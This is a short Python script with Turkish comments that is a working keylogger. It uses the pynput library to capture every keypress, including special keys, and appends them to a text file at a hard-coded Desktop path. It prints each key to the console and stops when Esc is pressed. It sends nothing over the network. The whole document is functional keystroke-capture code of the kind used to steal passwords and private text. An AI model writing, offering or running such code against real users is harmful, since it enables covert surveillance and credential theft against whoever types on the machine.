from pynput import keyboard

# Log dosyasının yolu
LOG_FILE = "/Users/erayasar/Desktop/keylogger/basilanTuslar.txt"

def tusa_basildiginda(tus):
    """
    Bir tuş basıldığında çağrılır ve tuş bilgisini log dosyasına kaydeder.
    """
    try:
        if hasattr(tus, 'char') and tus.char is not None:
            yazilacak_tus = tus.char
        else:
            yazilacak_tus = f"<{tus.name}>"

        print(f"Basılan tuş: {yazilacak_tus}")
        with open(LOG_FILE, "a", encoding="utf-8") as dosya:
            dosya.write(yazilacak_tus)
    except Exception as e:
        print(f"Bir hata oluştu: {e}")

def tus_birakildiginda(tus):
    """
    Bir tuş bırakıldığında çağrılır (isteğe bağlı bir işlev).
    """
    if tus == keyboard.Key.esc:
        # ESC tuşuna basıldığında dinleyiciyi durdur.
        print("ESC tuşuna basıldı. Program durduruluyor...")
        return False
    return True

def main():
    """
    Tuş dinleyicisini başlatır.
    """
    try:
        with open(LOG_FILE, "w", encoding="utf-8") as dosya:
            dosya.write("Keylogger başlatıldı\n")
            dosya.write("-" * 50 + "\n")
        
        with keyboard.Listener(on_press=tusa_basildiginda, on_release=tus_birakildiginda) as dinleyici:
            dinleyici.join()
    except Exception as e:
        print(f"Dinleyici başlatılırken bir hata oluştu: {e}")

if __name__ == "__main__":
    main()
